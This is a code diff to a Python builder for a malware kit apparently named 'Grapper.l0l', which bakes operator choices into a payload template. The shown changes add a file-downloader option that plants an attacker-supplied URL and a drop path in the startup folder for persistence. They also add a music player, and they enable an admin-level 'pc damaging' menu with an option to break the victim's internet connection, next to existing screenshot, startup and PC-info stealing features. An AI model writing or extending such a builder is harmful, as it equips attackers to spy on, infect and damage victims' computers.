@@ -92,16 +92,45 @@ ask("Screenshoot", "ss")
 ask("Startup", "startup")
 ask("Connection info", "con_info")
 ask("PC info", "pc_info")
+c = ask("File downloader", "down_file")
+if c == "y":
+    url = input(f"{red}[{res}URL{red}]{lred} > ")
+
+    with open("resources/code.py", "r") as f:
+        content = f.read()
+        new_content = content.replace("down_file_url = ''", f"down_file_url = '{url}'")
+    with open("resources/build.py", "w") as f:
+        f.write(new_content)
+    
+    path = input(f"{red}[{res}Path{red}]{lred} {black}(startup for startup path)> ")
+    if path == "startup":
+        path = "dir.startup"
+
+    with open("resources/code.py", "r") as f:
+        content = f.read()
+        new_content = content.replace("down_file_path = ''", f"down_file_path = '{path}'")
+    with open("resources/build.py", "w") as f:
+        f.write(new_content)
+
+c = ask("Music player", "play_music")
+if c == "y":
+    url = input(f"{red}[{res}URL{red}]{lred} > ")
+
+    with open("resources/code.py", "r") as f:
+        content = f.read()
+        new_content = content.replace("url = ''", f"url = '{url}'")
+    with open("resources/build.py", "w") as f:
+        f.write(new_content)
 
 
-#def ask_othr():
-#    c = input(f"{red} Do you want to continue to pc damaging/dangarous options? {black}(y/n)")
-#    if c == "y":
-#        exit()
-#    elif c == "n":
-#        pass
-#    else:
-#        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")
+def ask_othr():
+    c = input(f"{lred}Do you want to continue to pc damaging/dangarous options? {red}ADMIN IS NEEDED {black}(y/n){lred} > ")
+    if c == "y":
+        ask("Breake internet connection", "fuck_internet")
+    elif c == "n":
+        pass
+    else:
+        print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")
 
-#ask_othr()
+ask_othr()
 messagebox.showinfo("Grapper.l0l", "Build made!")
